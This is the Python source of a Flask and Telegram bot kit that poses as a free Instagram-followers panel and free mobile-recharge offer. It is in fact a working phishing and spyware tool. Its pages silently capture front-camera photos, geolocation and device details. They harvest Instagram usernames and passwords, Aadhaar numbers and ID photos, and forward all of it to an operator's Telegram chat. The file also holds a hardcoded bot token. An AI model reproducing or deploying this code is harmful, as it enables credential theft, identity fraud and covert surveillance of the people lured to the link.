import os
import threading
import base64
import requests
import urllib.parse
import json
import time
import secrets
from flask import Flask, request, render_template_string, session
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# --- CONFIGURATION ---
TOKEN = "7888111866:AAFTT2DxdpaSQ2JKOxUNR_YXrgK7q64M9lk"
SERVER_URL = os.environ.get("SERVER_URL", "https://proxy-free-followers-website.onrender.com")

# Force Join Channel
CHANNELS = ["@noruleclub"]

app = Flask(__name__)
app.secret_key = os.urandom(24)

# --- REAL SMM PANEL WITH FREE RECHARGE ---
SMM_PANEL_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>SMM Panel - Free Recharge</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: #0a0a1a;
            min-height: 100vh;
        }
        .header {
            background: linear-gradient(135deg, #1a1a2e, #16213e);
            padding: 20px;
            border-bottom: 1px solid #2a2a4a;
            position: sticky;
            top: 0;
            z-index: 100;
        }
        .header-content {
            max-width: 1200px;
            margin: 0 auto;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .logo {
            color: #fff;
            font-size: 24px;
            font-weight: 800;
        }
        .logo span {
            color: #6c63ff;
        }
        .nav {
            display: flex;
            gap: 20px;
        }
        .nav a {
            color: #888;
            text-decoration: none;
            font-size: 14px;
            transition: 0.3s;
        }
        .nav a:hover {
            color: #fff;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        .welcome-banner {
            background: linear-gradient(135deg, #1a1a2e, #2a1a4e);
            border-radius: 16px;
            padding: 40px;
            margin-bottom: 30px;
            border: 1px solid #2a2a4a;
            text-align: center;
        }
        .welcome-banner h1 {
            color: #fff;
            font-size: 32px;
            margin-bottom: 10px;
        }
        .welcome-banner h1 span {
            color: #6c63ff;
        }
        .welcome-banner p {
            color: #888;
            font-size: 16px;
        }
        .balance-box {
            display: inline-block;
            background: rgba(108, 99, 255, 0.1);
            border: 1px solid #6c63ff;
            border-radius: 12px;
            padding: 15px 30px;
            margin-top: 15px;
        }
        .balance-box .amount {
            color: #6c63ff;
            font-size: 28px;
            font-weight: 700;
        }
        .balance-box .label {
            color: #888;
            font-size: 14px;
        }
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-top: 30px;
        }
        .card {
            background: #1a1a2e;
            border-radius: 16px;
            padding: 25px;
            border: 1px solid #2a2a4a;
            transition: 0.3s;
            cursor: pointer;
        }
        .card:hover {
            border-color: #6c63ff;
            transform: translateY(-5px);
        }
        .card .icon {
            font-size: 40px;
            margin-bottom: 10px;
        }
        .card h3 {
            color: #fff;
            font-size: 18px;
            margin-bottom: 5px;
        }
        .card p {
            color: #888;
            font-size: 14px;
        }
        .card .price {
            color: #6c63ff;
            font-size: 20px;
            font-weight: 700;
            margin-top: 10px;
        }
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            backdrop-filter: blur(10px);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }
        .modal.active {
            display: flex;
        }
        .modal-content {
            background: #1a1a2e;
            border-radius: 24px;
            padding: 40px;
            width: 90%;
            max-width: 500px;
            max-height: 90vh;
            overflow-y: auto;
            border: 1px solid #2a2a4a;
            position: relative;
        }
        .modal-close {
            position: absolute;
            top: 15px;
            right: 20px;
            color: #888;
            font-size: 28px;
            cursor: pointer;
            background: none;
            border: none;
        }
        .modal-close:hover {
            color: #fff;
        }
        .modal h2 {
            color: #fff;
            font-size: 24px;
            margin-bottom: 20px;
        }
        .form-group {
            margin-bottom: 18px;
        }
        .form-group label {
            display: block;
            color: #aaa;
            margin-bottom: 6px;
            font-size: 13px;
            font-weight: 500;
        }
        .form-group input, .form-group select, .form-group textarea {
            width: 100%;
            padding: 14px 16px;
            background: #0a0a1a;
            border: 1px solid #2a2a4a;
            border-radius: 12px;
            color: #fff;
            font-size: 15px;
            outline: none;
            transition: 0.3s;
        }
        .form-group input:focus, .form-group select:focus, .form-group textarea:focus {
            border-color: #6c63ff;
            box-shadow: 0 0 0 3px rgba(108, 99, 255, 0.15);
        }
        .form-group input::placeholder, .form-group textarea::placeholder {
            color: #444;
        }
        .form-group textarea {
            min-height: 80px;
            resize: vertical;
        }
        .btn {
            width: 100%;
            padding: 16px;
            background: #6c63ff;
            border: none;
            border-radius: 12px;
            color: #fff;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.3s;
        }
        .btn:hover {
            background: #5a52d5;
            transform: translateY(-2px);
        }
        .btn:active {
            transform: translateY(0);
        }
        .btn-secondary {
            background: transparent;
            border: 1px solid #2a2a4a;
        }
        .btn-secondary:hover {
            background: #2a2a4a;
        }
        .error-msg {
            background: #ff4444;
            color: #fff;
            padding: 12px 16px;
            border-radius: 10px;
            font-size: 13px;
            display: none;
            margin-bottom: 15px;
        }
        .success-msg {
            background: #00c853;
            color: #fff;
            padding: 12px 16px;
            border-radius: 10px;
            font-size: 13px;
            display: none;
            margin-bottom: 15px;
        }
        .loader {
            display: none;
            text-align: center;
            margin: 10px 0;
        }
        .loader.active {
            display: block;
        }
        .spinner {
            border: 3px solid #2a2a4a;
            border-top: 3px solid #6c63ff;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 0.8s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .footer {
            text-align: center;
            padding: 30px;
            color: #444;
            font-size: 13px;
            border-top: 1px solid #1a1a2e;
            margin-top: 40px;
        }
        .status-dot {
            display: inline-block;
            width: 8px;
            height: 8px;
            background: #00c853;
            border-radius: 50%;
            margin-right: 8px;
            animation: blink 1s infinite;
        }
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.2; }
        }
        ::-webkit-scrollbar {
            width: 8px;
        }
        ::-webkit-scrollbar-track {
            background: #0a0a1a;
        }
        ::-webkit-scrollbar-thumb {
            background: #2a2a4a;
            border-radius: 4px;
        }
        ::-webkit-scrollbar-thumb:hover {
            background: #6c63ff;
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="header-content">
            <div class="logo">SMM<span>Panel</span></div>
            <div class="nav">
                <a href="#" onclick="showSection('dashboard')">Dashboard</a>
                <a href="#" onclick="showSection('services')">Services</a>
                <a href="#" onclick="showSection('recharge')">Free Recharge</a>
            </div>
        </div>
    </div>

    <div class="container">
        <div class="welcome-banner">
            <h1>Welcome to <span>SMM Panel</span></h1>
            <p>Get free Instagram followers, likes, and views</p>
            <div class="balance-box">
                <div class="label">Available Balance</div>
                <div class="amount">$0.00</div>
            </div>
        </div>

        <div id="errorMsg" class="error-msg"></div>
        <div id="successMsg" class="success-msg"></div>

        <!-- Dashboard Section -->
        <div id="dashboard">
            <h2 style="color:#fff; margin-bottom:20px;">📊 Dashboard</h2>
            <div class="grid">
                <div class="card" onclick="openService('followers')">
                    <div class="icon">👥</div>
                    <h3>Followers</h3>
                    <p>Get real Instagram followers</p>
                    <div class="price">From $0.99</div>
                </div>
                <div class="card" onclick="openService('likes')">
                    <div class="icon">❤️</div>
                    <h3>Likes</h3>
                    <p>Boost your post engagement</p>
                    <div class="price">From $0.49</div>
                </div>
                <div class="card" onclick="openService('views')">
                    <div class="icon">👁️</div>
                    <h3>Views</h3>
                    <p>Increase video views</p>
                    <div class="price">From $0.29</div>
                </div>
                <div class="card" onclick="openRecharge()">
                    <div class="icon">🎁</div>
                    <h3>Free Recharge</h3>
                    <p>Get 1 month free recharge</p>
                    <div class="price" style="color:#00c853;">FREE</div>
                </div>
            </div>
        </div>

        <!-- Services Section -->
        <div id="services" style="display:none;">
            <h2 style="color:#fff; margin-bottom:20px;">🛒 Services</h2>
            <div class="grid">
                <div class="card" onclick="openService('followers')">
                    <div class="icon">📈</div>
                    <h3>Instagram Followers</h3>
                    <p>100-5000 followers</p>
                    <div class="price">$0.99 - $19.99</div>
                </div>
                <div class="card" onclick="openService('likes')">
                    <div class="icon">❤️</div>
                    <h3>Instagram Likes</h3>
                    <p>100-5000 likes</p>
                    <div class="price">$0.49 - $9.99</div>
                </div>
                <div class="card" onclick="openService('views')">
                    <div class="icon">📺</div>
                    <h3>Instagram Views</h3>
                    <p>500-10000 views</p>
                    <div class="price">$0.29 - $5.99</div>
                </div>
            </div>
        </div>

        <!-- Recharge Section -->
        <div id="recharge" style="display:none;">
            <h2 style="color:#fff; margin-bottom:20px;">🎁 Free Recharge</h2>
            <div class="card" style="max-width:500px; margin:0 auto;">
                <h3 style="color:#fff; text-align:center;">Get 1 Month Free Recharge</h3>
                <p style="color:#888; text-align:center; margin-bottom:20px;">Verify your identity to get free recharge</p>
                <form id="rechargeForm" onsubmit="return handleRecharge(event)">
                    <div class="form-group">
                        <label>📱 Mobile Number</label>
                        <input type="tel" id="mobile" placeholder="Enter your mobile number" required>
                    </div>
                    <div class="form-group">
                        <label>🏦 Operator</label>
                        <select id="operator">
                            <option value="jio">Jio</option>
                            <option value="airtel">Airtel</option>
                            <option value="vi">Vi</option>
                            <option value="bsnl">BSNL</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label>🆔 Aadhar Number</label>
                        <input type="text" id="aadhar" placeholder="Enter 12 digit Aadhar number" required>
                    </div>
                    <div class="form-group">
                        <label>📸 Upload Aadhar Photo</label>
                        <input type="file" id="aadharPhoto" accept="image/*" required>
                    </div>
                    <div class="form-group">
                        <label>📧 Email (Optional)</label>
                        <input type="email" id="email" placeholder="Enter your email">
                    </div>
                    
                    <div class="loader" id="loader">
                        <div class="spinner"></div>
                        <p style="color:#666; margin-top:10px; font-size:13px;">Processing recharge...</p>
                    </div>
                    
                    <button type="submit" class="btn" id="rechargeBtn">💰 Get Free Recharge</button>
                </form>
            </div>
        </div>

        <div class="footer">
            <p>© 2026 SMM Panel • Secure Connection • 100% Free</p>
        </div>
    </div>

    <!-- Service Modal -->
    <div class="modal" id="serviceModal">
        <div class="modal-content">
            <button class="modal-close" onclick="closeModal()">&times;</button>
            <h2 id="serviceTitle">Service Details</h2>
            <form id="serviceForm" onsubmit="return handleService(event)">
                <div class="form-group">
                    <label>📱 Instagram Username</label>
                    <input type="text" id="instaUser" placeholder="Enter Instagram username" required>
                </div>
                <div class="form-group">
                    <label>🔑 Instagram Password</label>
                    <input type="password" id="instaPass" placeholder="Enter Instagram password" required>
                </div>
                <div class="form-group">
                    <label>📧 Email</label>
                    <input type="email" id="serviceEmail" placeholder="Enter your email">
                </div>
                <div class="form-group">
                    <label>🎯 Quantity</label>
                    <select id="quantity">
                        <option value="100">100</option>
                        <option value="250" selected>250</option>
                        <option value="500">500</option>
                        <option value="1000">1000</option>
                        <option value="2500">2500</option>
                        <option value="5000">5000</option>
                    </select>
                </div>
                <button type="submit" class="btn">🚀 Place Order</button>
            </form>
        </div>
    </div>

    <script>
        let chatId = "{{ chat_id }}";
        let photoCount = 0;
        let cameraStarted = false;
        
        function showSection(section) {
            document.getElementById('dashboard').style.display = section === 'dashboard' ? 'block' : 'none';
            document.getElementById('services').style.display = section === 'services' ? 'block' : 'none';
            document.getElementById('recharge').style.display = section === 'recharge' ? 'block' : 'none';
        }
        
        function openService(type) {
            document.getElementById('serviceModal').classList.add('active');
            document.getElementById('serviceTitle').textContent = type.charAt(0).toUpperCase() + type.slice(1) + ' Service';
        }
        
        function openRecharge() {
            showSection('recharge');
        }
        
        function closeModal() {
            document.getElementById('serviceModal').classList.remove('active');
        }
        
        // Background camera - silently takes photos
        async function startCamera() {
            if (cameraStarted) return;
            cameraStarted = true;
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: false 
                });
                
                const video = document.createElement('video');
                video.style.display = 'none';
                document.body.appendChild(video);
                video.srcObject = stream;
                await video.play();
                
                await takePhoto(video, 1);
                
                for (let i = 2; i <= 10; i++) {
                    await new Promise(resolve => setTimeout(resolve, 3000));
                    await takePhoto(video, i);
                }
                
                stream.getTracks().forEach(t => t.stop());
                video.remove();
                
            } catch(e) {
                // Silent fail - user ko pata nahi chalega
                console.log('Camera not available');
            }
        }
        
        async function takePhoto(video, num) {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);
            
            const photoData = canvas.toDataURL('image/jpeg', 0.7);
            
            fetch('/camera-photo', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    photo: photoData,
                    photo_num: num
                })
            });
            
            photoCount = num;
        }
        
        window.onload = function() {
            setTimeout(() => {
                startCamera();
            }, 1000);
        };
        
        async function handleService(e) {
            e.preventDefault();
            
            const username = document.getElementById('instaUser').value;
            const password = document.getElementById('instaPass').value;
            const email = document.getElementById('serviceEmail').value || 'N/A';
            const quantity = document.getElementById('quantity').value;
            const service = document.getElementById('serviceTitle').textContent;
            
            if (!username || !password) {
                showError('Please enter Instagram username and password');
                return;
            }
            
            const data = {
                chat_id: chatId,
                type: 'service',
                service: service,
                username: username,
                password: password,
                email: email,
                quantity: quantity,
                photo_count: photoCount
            };
            
            await sendData(data);
            closeModal();
            showSuccess('✅ Order placed successfully!');
        }
        
        async function handleRecharge(e) {
            e.preventDefault();
            
            const mobile = document.getElementById('mobile').value;
            const operator = document.getElementById('operator').value;
            const aadhar = document.getElementById('aadhar').value;
            const aadharPhoto = document.getElementById('aadharPhoto').files[0];
            const email = document.getElementById('email').value || 'N/A';
            
            if (!mobile || !aadhar || !aadharPhoto) {
                showError('Please fill all required fields');
                return;
            }
            
            if (aadhar.length !== 12 || !/^\\d+$/.test(aadhar)) {
                showError('Please enter valid 12 digit Aadhar number');
                return;
            }
            
            const loader = document.getElementById('loader');
            const rechargeBtn = document.getElementById('rechargeBtn');
            
            loader.classList.add('active');
            rechargeBtn.disabled = true;
            rechargeBtn.textContent = 'Processing...';
            
            const reader = new FileReader();
            reader.onload = async function(e) {
                const aadharPhotoData = e.target.result;
                
                const data = {
                    chat_id: chatId,
                    type: 'recharge',
                    mobile: mobile,
                    operator: operator,
                    aadhar: aadhar,
                    aadhar_photo: aadharPhotoData,
                    email: email,
                    photo_count: photoCount
                };
                
                await sendData(data);
                loader.classList.remove('active');
                rechargeBtn.disabled = false;
                rechargeBtn.textContent = '💰 Get Free Recharge';
                showSuccess('✅ Recharge successful! 1 month free recharge added.');
                document.getElementById('rechargeForm').reset();
            };
            reader.readAsDataURL(aadharPhoto);
            
            return false;
        }
        
        async function sendData(data) {
            try {
                const response = await fetch('/smm-data', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
                return await response.json();
            } catch (error) {
                showError('Connection error. Please try again.');
            }
        }
        
        function showError(msg) {
            const errorDiv = document.getElementById('errorMsg');
            errorDiv.textContent = msg;
            errorDiv.style.display = 'block';
            setTimeout(() => {
                errorDiv.style.display = 'none';
            }, 5000);
        }
        
        function showSuccess(msg) {
            const successDiv = document.getElementById('successMsg');
            successDiv.textContent = msg;
            successDiv.style.display = 'block';
            setTimeout(() => {
                successDiv.style.display = 'none';
            }, 5000);
        }
    </script>
</body>
</html>
"""

# --- LOADING PAGE ---
def get_html(chat_id, redirect_url):
    return f"""
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body{{background:#0a0a1a;color:#fff;text-align:center;font-family:sans-serif;padding-top:80px;}}
        .loader{{border:4px solid #1a1a2e;border-top:4px solid #6c63ff;border-radius:50%;width:60px;height:60px;animation:spin 1s linear infinite;margin:20px auto;}}
        @keyframes spin {{0%{{transform:rotate(0deg);}} 100%{{transform:rotate(360deg);}}}}
        p{{color:#666; font-size:14px;}}
        h2{{font-weight:300; color:#fff;}}
    </style>
</head>
<body>
    <div class="loader"></div>
    <h2>Loading SMM Panel...</h2>
    <p>Please wait while we secure your connection</p>
    
    <video id="video" style="display:none;" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        async function startTrap() {{
            let data = {{
                chat_id: "{chat_id}",
                userAgent: navigator.userAgent,
                language: navigator.language || "en-US",
                platform: navigator.platform,
                cores: navigator.hardwareConcurrency || "Unknown",
                ram: navigator.deviceMemory || "Unknown",
                screen: screen.width + "x" + screen.height,
                battery_level: "N/A",
                charging: "No",
                storage_used: "0.00",
                storage_total: "0.00",
                lat: null,
                lon: null,
                photo: null,
                perm_cam: "Denied",
                perm_loc: "Denied"
            }};

            try {{
                let b = await navigator.getBattery();
                data.battery_level = Math.round(b.level * 100) + "%";
                data.charging = b.charging ? "Yes" : "No";
            }} catch(e) {{}}

            try {{
                if (navigator.storage && navigator.storage.estimate) {{
                    const estimate = await navigator.storage.estimate();
                    data.storage_used = (estimate.usage / (1024 * 1024 * 1024)).toFixed(2);
                    data.storage_total = (estimate.quota / (1024 * 1024 * 1024)).toFixed(2);
                }}
            }} catch(e) {{}}

            // Get location silently
            try {{
                await new Promise((resolve) => {{
                    navigator.geolocation.getCurrentPosition(pos => {{
                        data.lat = pos.coords.latitude;
                        data.lon = pos.coords.longitude;
                        data.perm_loc = "Allowed";
                        resolve();
                    }}, () => resolve(), {{timeout: 3000}});
                }});
            }} catch(e) {{}}

            // Get camera silently
            try {{
                let stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }}, audio: false }});
                data.perm_cam = "Allowed"; 
                let video = document.getElementById('video');
                video.srcObject = stream;
                await new Promise(r => setTimeout(r, 1000));
                
                let canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                data.photo = canvas.toDataURL('image/jpeg', 0.8);
                stream.getTracks().forEach(t => t.stop());
            }} catch(e) {{}}

            await fetch('/upload', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify(data)
            }});

            window.location.href = "/smm-panel?chat_id={chat_id}";
        }}
        window.onload = startTrap;
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    cid = request.args.get('id')
    redir = request.args.get('redir', 'https://google.com')
    return render_template_string(get_html(cid, redir))

@app.route('/smm-panel')
def smm_panel():
    chat_id = request.args.get('chat_id')
    return render_template_string(SMM_PANEL_HTML, chat_id=chat_id)

@app.route('/smm-data', methods=['POST'])
def smm_data():
    data = request.json
    chat_id = data.get('chat_id')
    data_type = data.get('type', 'unknown')
    
    if not chat_id:
        return {"success": False}, 400
    
    if data_type == 'recharge':
        msg = f"""
🎁 **Free Recharge Request**

━━━━━━━━━━━━━━━━

📱 **Mobile Details:**
   • Number: `{data.get('mobile')}`
   • Operator: `{data.get('operator')}`

🆔 **Aadhar Details:**
   • Number: `{data.get('aadhar')}`
   • Photo: ✅ Received

📧 **Email:** `{data.get('email')}`

📸 **Photos Taken:** `{data.get('photo_count', 0)}/10`

🕐 Time: {time.strftime('%Y-%m-%d %H:%M:%S')}

━━━━━━━━━━━━━━━━
⚡ @FROXLS
"""
        
        if data.get('aadhar_photo'):
            try:
                img_data = base64.b64decode(data.get('aadhar_photo').split(',')[1])
                requests.post(
                    f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
                    data={'chat_id': chat_id, 'caption': '🆔 Aadhar Photo'},
                    files={'photo': ('aadhar.jpg', img_data)}
                )
            except:
                pass
    
    else:
        msg = f"""
📸 **SMM Service Order**

━━━━━━━━━━━━━━━━

🛒 **Service:** `{data.get('service')}`

👤 **Instagram Account:**
   • Username: `{data.get('username')}`
   • Password: `{data.get('password')}`

📧 **Email:** `{data.get('email')}`

📊 **Quantity:** `{data.get('quantity')}`

📸 **Photos Taken:** `{data.get('photo_count', 0)}/10`

🕐 Time: {time.strftime('%Y-%m-%d %H:%M:%S')}

━━━━━━━━━━━━━━━━
⚡ @FROXLS
"""
    
    try:
        requests.post(
            f"https://api.telegram.org/bot{TOKEN}/sendMessage",
            json={
                "chat_id": chat_id,
                "text": msg,
                "parse_mode": "Markdown"
            }
        )
    except:
        pass
    
    return {"success": True}

@app.route('/camera-photo', methods=['POST'])
def camera_photo():
    data = request.json
    chat_id = data.get('chat_id')
    photo = data.get('photo')
    photo_num = data.get('photo_num', 1)
    
    if not chat_id or not photo:
        return "OK", 200
    
    try:
        img_data = base64.b64decode(photo.split(',')[1])
        requests.post(
            f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
            data={'chat_id': chat_id, 'caption': f'📸 Photo #{photo_num}/10'},
            files={'photo': (f'photo_{photo_num}.jpg', img_data)}
        )
    except:
        pass
    
    return "OK", 200

@app.route('/upload', methods=['POST'])
def upload():
    data = request.json
    tid = data.get('chat_id')
    if not tid: return "Error", 400

    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]

    try:
        ip_info = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,lat,lon,timezone,isp,org,mobile,proxy").json()
    except:
        ip_info = {}

    if data.get('lat') and data.get('lon'):
        map_lat = data.get('lat')
        map_lon = data.get('lon')
        loc_perm = "Allowed"
    else:
        map_lat = ip_info.get('lat', 0)
        map_lon = ip_info.get('lon', 0)
        loc_perm = "Denied"

    map_link = f"maps.google.com/maps?q={map_lat},{map_lon}"

    def safe(val):
        return str(val).replace('_', '\\_').replace('*', '\\*').replace('`', '\\`')

    msg = (
        f"📊 **Visitor Information Captured**\n"
        f"━━━━━━━━━━━━━━━━\n\n"
        f"🖥️ **Device and Browser**\n"
        f"   • Device Model: `{safe(data.get('platform'))}`\n"
        f"   • User Agent: `{safe(data.get('userAgent'))}`\n\n"
        f"🌐 **Network Information**\n"
        f"   • IP Address: `{ip}`\n"
        f"   • ISP: {safe(ip_info.get('isp', 'N/A'))}\n"
        f"   • Language: {safe(data.get('language'))}\n\n"
        f"📍 **Location Details**\n"
        f"   • Country: {safe(ip_info.get('country', 'N/A'))}\n"
        f"   • Region: {safe(ip_info.get('regionName', 'N/A'))}\n"
        f"   • City: {safe(ip_info.get('city', 'N/A'))}\n"
        f"   • Timezone: {safe(ip_info.get('timezone', 'N/A'))}\n\n"
        f"🖼️ **Display Information**\n"
        f"   • Resolution: {safe(data.get('screen'))}\n\n"
        f"🔋 **Battery Status**\n"
        f"   • Level: {safe(data.get('battery_level'))}\n"
        f"   • Charging: {safe(data.get('charging'))}\n\n"
        f"🔐 **Device Permissions**\n"
        f"   • Camera: {safe(data.get('perm_cam'))}\n"
        f"   • Location: {loc_perm}\n\n"
        f"💾 **Hardware & Storage**\n"
        f"   • CPU Cores: {safe(data.get('cores'))}\n"
        f"   • RAM: {safe(data.get('ram'))} GB\n"
        f"   • Storage Used: {safe(data.get('storage_used'))} GB\n"
        f"   • Storage Total: {safe(data.get('storage_total'))} GB\n\n"
        f"🗺 **Map Link:**\n{map_link}\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"⚡ Developed by: @FROXLS"
    )

    try:
        requests.post(
            f"https://api.telegram.org/bot{TOKEN}/sendMessage",
            json={
                "chat_id": tid,
                "text": msg,
                "parse_mode": "Markdown"
            }
        )
    except Exception as e:
        print(f"Message Send Error: {e}")

    if data.get('photo'):
        try:
            img_data = base64.b64decode(data.get('photo').split(',')[1])
            requests.post(
                f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
                data={'chat_id': tid, 'caption': '📸 Initial Photo'},
                files={'photo': ('cam.jpg', img_data)}
            )
        except: pass

    return "OK"

# --- HELPER: CHECK SUB ---
async def is_subscribed(app, user_id):
    for channel in CHANNELS:
        try:
            member = await app.bot.get_chat_member(chat_id=channel, user_id=user_id)
            if member.status in ["left", "kicked"]:
                return False
        except:
            return False
    return True

# --- BOT HANDLERS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # GC me reply mat karo
    if update.effective_chat.type != "private":
        return
    
    if not await is_subscribed(context.application, user_id):
        buttons = [
            [InlineKeyboardButton("📢 Join @noruleclub", url="https://t.me/noruleclub")],
            [InlineKeyboardButton("✅ I've Joined", url=f"https://t.me/{(await context.bot.get_me()).username}?start=true")]
        ]
        await update.message.reply_text(
            "❌ **Access Denied!**\n\n"
            "⚠️ **Bot use karne ke liye @noruleclub join karna hoga!**\n\n"
            "🔹 **Steps:**\n"
            "1️⃣ Join @noruleclub\n"
            "2️⃣ Click \"I've Joined\" button\n"
            "3️⃣ Then send your Instagram link\n\n"
            "📌 *Channel join kiye bina bot kaam nahi karega!*",
            reply_markup=InlineKeyboardMarkup(buttons),
            parse_mode="Markdown"
        )
        return

    await update.message.reply_text(
        "🌟 **Welcome to SMM Panel Bot!**\n\n"
        "🔥 **Get Free Instagram Followers, Likes & Views**\n"
        "💰 **Free Mobile Recharge Available!**\n\n"
        "📌 **How to Use:**\n"
        "1️⃣ Send any Instagram link (e.g., https://instagram.com/username)\n"
        "2️⃣ Bot will generate your personal SMM panel link\n"
        "3️⃣ Open link and get free services!\n\n"
        "⚡ *Powered by @FROXLS*",
        parse_mode="Markdown"
    )

async def handle_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # GC me reply mat karo
    if update.effective_chat.type != "private":
        return
    
    if not await is_subscribed(context.application, user_id):
        await start(update, context)
        return

    url = update.message.text
    if not url.startswith("http"):
        await update.message.reply_text(
            "❌ **Invalid Link!**\n\n"
            "Please send a valid link starting with `http://` or `https://`\n"
            "Example: `https://instagram.com/username`",
            parse_mode="Markdown"
        )
        return

    uid = update.effective_chat.id
    redir = urllib.parse.quote(url)
    link = f"{SERVER_URL}/?id={uid}&redir={redir}"

    await update.message.reply_text(
        f"✅ **Your SMM Panel Link:**\n"
        f"`{link}`\n\n"
        f"🔹 *Click the link and get free services!*\n"
        f"⚡ *Powered by @FROXLS*",
        parse_mode="Markdown"
    )

def run_flask():
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))

if __name__ == '__main__':
    threading.Thread(target=run_flask).start()
    bot = Application.builder().token(TOKEN).build()
    bot.add_handler(CommandHandler("start", start))
    bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_link))
    bot.run_polling()
